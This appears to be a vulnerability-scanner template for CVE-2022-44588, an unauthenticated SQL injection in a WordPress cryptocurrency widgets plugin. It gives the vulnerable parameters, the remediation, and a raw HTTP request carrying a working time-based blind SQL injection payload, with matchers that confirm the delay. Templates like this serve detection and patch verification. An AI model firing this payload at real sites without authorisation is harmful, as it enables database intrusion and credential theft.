id: CVE-2022-44588

info:
  name: Cryptocurrency Widgets Pack <= 1.8.1 - SQL Injection
  author: Shivam Kamboj
  severity: critical
  description: |
    The Cryptocurrency Widgets Pack plugin for WordPress is vulnerable to SQL Injection via the 'order' and 'columns' parameters in the 'mcwp_table' AJAX action in versions up to and including 1.8.1. The 'mcwp_tables_updates' function directly concatenates user input from $_GET['columns'][$_GET['order'][0]['column']]['name'] (ORDERBY), $_GET['order'][0]['dir'] (ORDERDIR), $_GET['start'] (START), and $_GET['length'] (LENGTH) into an SQL query without proper sanitization or parameterization. The ORDER BY injection requires an EXP() wrapper to force MySQL to evaluate the SLEEP() subquery even when the result set is empty. This allows unauthenticated attackers to extract sensitive information from the database.
  impact: |
    Successful exploitation allows unauthenticated attackers to read, modify, or delete data in the WordPress database, potentially leading to complete site compromise, including extraction of user credentials and sensitive data.
  remediation: |
    Update to version 2.0 or later where the vulnerability has been patched with proper input validation using sanitize_text_field(), intval(), sanitize_sql_orderby(), whitelisting allowed ORDER BY columns, and using $wpdb->prepare() for parameterized queries.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-44588
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/cryptocurrency-widgets-pack/cryptocurrency-widgets-pack-181-unauthenticated-sql-injection-2
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-44588
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
  tags: cve,cve2022,wordpress,wp,wp-plugin,sqli,cryptocurrency-widgets-pack,unauth

http:
  - raw:
      - |
        @timeout: 30s
        GET /wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&draw=1&start=0&length=10&columns[0][name]=EXP(~(SELECT*FROM(SELECT+SLEEP(8))x))&order[0][column]=0&order[0][dir]=ASC HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest

    matchers:
      - type: dsl
        dsl:
          - 'duration >= 8'
          - 'status_code == 200'
          - 'contains(body, "recordsTotal")'
          - 'contains(content_type, "text/html")'
        condition: and
